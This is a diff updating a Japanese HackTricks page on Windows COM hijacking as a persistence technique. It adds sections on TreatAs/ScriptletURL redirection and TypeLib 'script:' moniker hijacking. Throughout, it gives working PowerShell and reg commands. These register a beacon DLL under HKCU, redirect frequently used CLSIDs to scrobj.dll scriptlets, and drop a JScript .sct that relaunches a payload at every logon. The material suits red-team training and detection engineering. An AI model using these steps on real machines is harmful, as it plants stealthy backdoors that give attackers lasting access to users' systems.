@@ -4,21 +4,28 @@
 
 ### 存在しない COM コンポーネントの検索
 
-HKCU の値はユーザーによって変更できるため、**COM Hijacking** は**永続化の手段**として利用できます。`procmon` を使用すると、攻撃者が永続化のために作成できる、存在しない COM レジストリが検索された箇所を簡単に見つけられます。フィルタ:
+ユーザーは HKCU の値を変更できるため、**COM Hijacking** は **persistence mechanism** として使われる可能性があります。`procmon` を使うと、まだ存在しないが攻撃者が作成できるような検索された COM レジストリを簡単に見つけられます。典型的なフィルタ:
 
-- **RegOpenKey** の操作。
+- **RegOpenKey** 操作。
 - _Result_ が **NAME NOT FOUND** のもの。
 - _Path_ が **InprocServer32** で終わるもの。
 
-偽装する存在しない COM を決めたら、以下のコマンドを実行します。_数秒ごとに読み込まれる COM を偽装すると過剰な動作を引き起こす可能性があるので注意してください。_
+調査時の有用なバリエーション:
+
+- 欠落している **`LocalServer32`** キーも確認してください。いくつかの COM クラスはプロセス外のサーバーで、DLL の代わりに攻撃者制御の EXE を起動します。
+- `InprocServer32` に加えて **`TreatAs`** と **`ScriptletURL`** のレジストリ操作も検索してください。最近の検出ルールやマルウェア解析でこれらがよく指摘されるのは、通常の COM 登録よりもはるかに稀で、シグナルが高いからです。
+- 登録を HKCU にクローンする際には、元の `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` から正当な **`ThreadingModel`** をコピーしてください。間違ったモデルを使うとアクティベーションが失敗し、ハイジャックが目立つことが多いです。
+- 64-bit システムでは 64-bit と 32-bit の両方のビューを確認してください（`procmon.exe` vs `procmon64.exe`、`HKLM\Software\Classes` と `HKLM\Software\Classes\WOW6432Node`）。32-bit アプリケーションは別の COM 登録を参照する可能性があります。
+
+どの存在しない COM をなりすますか決めたら、次のコマンドを実行してください。_数秒ごとに読み込まれる COM をなりすます場合は、過剰になり得るため注意してください。_
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
-### ハイジャック可能な Task Scheduler COM コンポーネント
+### Hijackable Task Scheduler COM components
 
-Windows Tasks は Custom Triggers を使って COM オブジェクトを呼び出します。Task Scheduler 経由で実行されるため、いつトリガーされるかを予測しやすくなります。
+Windows TasksはCustom Triggersを使ってCOM objectsを呼び出します。Task Schedulerを通じて実行されるため、いつトリガーされるかを予測しやすくなります。
 
 <pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
 $Tasks = Get-ScheduledTask
@@ -49,9 +56,9 @@ Write-Host
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
 # [more like the previous one...]</code></pre>
 
-出力を確認すると、例えば **ユーザーがログインするたび** 実行されるタスクを選べます。
+出力を確認すると、例えば**ユーザーがログインするたびに**実行されるものを選べます。
 
-次に、CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** を **HKEY\CLASSES\ROOT\CLSID** と HKLM および HKCU で検索すると、通常その値は HKCU に存在しないことが分かります。
+次にCLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** を **HKEY\CLASSES\ROOT\CLSID** と HKLM および HKCU で検索すると、通常その値は HKCU には存在しないことが分かります。
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -72,32 +79,61 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-その後、HKCU エントリを作成するだけで、ユーザーがログインするたびにあなたの backdoor が実行されます。
+その後、HKCU のエントリを作成するだけで、ユーザーがログインするたびに backdoor が実行されます。
 
 ---
 
+## COM TreatAs Hijacking + ScriptletURL
+
+`TreatAs` はある CLSID を別のものとしてエミュレートできます。攻撃の観点では、元の CLSID をそのままにして、`scrobj.dll` を指すユーザー毎の二つ目の CLSID を作成し、実際の COM オブジェクトを `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` で悪意のあるものにリダイレクトできます。
+
+これは以下のような場合に有用です:
+
+- ターゲットアプリケーションが既にログオン時またはアプリ起動時に安定した CLSID をインスタンス化している場合
+- 元の `InprocServer32` を置き換える代わりにレジストリのみでリダイレクトしたい場合
+- `ScriptletURL` 値を介してローカルまたはリモートの `.sct` スクリプトレットを実行したい場合
+
+Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
+```cmd
+:: 1. Create a malicious per-user COM class backed by scrobj.dll
+reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
+reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
+reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
+reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
+reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
+reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f
+
+:: 2. Redirect a high-frequency CLSID to the malicious class
+reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
+```
+注意:
+
+- `scrobj.dll` は `ScriptletURL` 値を読み取り、参照された `.sct` を実行するため、ペイロードをローカルファイルとして保持するか、HTTP/HTTPS 経由でリモートから取得できます。
+- `TreatAs` は、元の COM 登録が HKLM に完全かつ安定している場合に特に便利です。ツリー全体をミラーリングする代わりに、少量のユーザーごとのリダイレクトで済みます。
+- 自然なトリガーを待たずに検証するには、対象クラスが STA アクティベーションをサポートしていれば、`rundll32.exe -sta <ProgID-or-CLSID>` で偽の ProgID/CLSID を手動でインスタンス化できます。
+
 ## COM TypeLib Hijacking (script: moniker persistence)
 
-Type Libraries (TypeLib) は COM インターフェースを定義し、`LoadTypeLib()` を介して読み込まれます。COM サーバーがインスタンス化されると、OS は関連する TypeLib を `HKCR\TypeLib\{LIBID}` 以下のレジストリキーを参照して読み込むことがあります。TypeLib のパスが **moniker**（例: `script:C:\...\evil.sct`）で置き換えられると、TypeLib が解決される際に Windows は scriptlet を実行します — これにより、一般的なコンポーネントが呼び出されたときに発動するステルス性の高い持続化が得られます。
+Type Libraries (TypeLib) は COM インターフェースを定義し、`LoadTypeLib()` を通じて読み込まれます。COM サーバがインスタンス化されると、OS は `HKCR\TypeLib\{LIBID}` 以下のレジストリキーを参照して関連する TypeLib を読み込むことがあります。TypeLib のパスが **moniker**（例: `script:C:\...\evil.sct`）に置き換えられていると、TypeLib が解決される際に Windows はその scriptlet を実行します — これにより、一般的なコンポーネントが触れられたときに起動するステルス性の高い persistence が得られます。
 
-これは Microsoft Web Browser control に対して確認されており（Internet Explorer、WebBrowser を埋め込んだアプリ、さらには `explorer.exe` によって頻繁に読み込まれます）。
+This has been observed against the Microsoft Web Browser control (frequently loaded by Internet Explorer, apps embedding WebBrowser, and even `explorer.exe`).
 
 ### Steps (PowerShell)
 
-1) 高頻度で使用される CLSID が使用する TypeLib (LIBID) を特定します。例として、マルウェアチェーンにより頻繁に悪用される CLSID: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser)。
+1) Identify the TypeLib (LIBID) used by a high-frequency CLSID. Example CLSID often abused by malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
 ```powershell
 $clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
 $libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
 $ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
 "CLSID=$clsid  LIBID=$libid  VER=$ver"
 ```
-2) ユーザーごとの TypeLib パスをローカルの scriptlet を指すように `script:` モニカーで設定する（管理者権限不要):
+2) ユーザーごとの TypeLib パスをローカルの scriptlet に `script:` モニカーで向ける（管理者権限不要）:
 ```powershell
 $dest = 'C:\\ProgramData\\Udate_Srv.sct'
 New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
 Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
 ```
-3) Drop 最小限の JScript `.sct` を配置して primary payload（例: initial chain で使用される `.lnk`）を再起動する:
+3) 最小限の JScript `.sct` を配置し、主要な payload（例: 初期チェーンで使用された `.lnk`）を再実行する:
 ```xml
 <?xml version="1.0"?>
 <scriptlet>
@@ -114,7 +150,7 @@ sh.Run(cmd, 0, false);
 </script>
 </scriptlet>
 ```
-4) トリガー – IE を開く、WebBrowser control を埋め込んだアプリケーションを起動する、あるいは通常の Explorer の操作でさえ TypeLib をロードして scriptlet を実行し、ログオン/再起動時に chain を再有効化します。
+4) トリガー – IE を開くこと、WebBrowser control を埋め込んだアプリケーションを開くこと、あるいは通常の Explorer の操作でさえ TypeLib をロードして scriptlet を実行し、logon/reboot 時にチェーンを再度有効化します。
 
 クリーンアップ
 ```powershell
@@ -123,13 +159,15 @@ Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$n
 # Delete the dropped scriptlet
 Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
 ```
-注意
-- 他の高頻度で使用される COM コンポーネントにも同じロジックを適用できます；常に実際の `LIBID` を先に `HKCR\CLSID\{CLSID}\TypeLib` から解決してください。
-- 64-bit システムでは、64-bit の利用者向けに `win64` サブキーも設定できます。
+注意事項
+- 同じロジックは他の高頻度の COM コンポーネントにも適用できます; まず `HKCR\CLSID\{CLSID}\TypeLib` から実際の `LIBID` を解決してください。
+- 64-bit システムでは、64-bit のクライアント向けに `win64` サブキーを追加することもできます。
 
-## 参考
+## 参考資料
 
 - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
 - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
+- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
 
 {{#include ../../banners/hacktricks-training.md}}
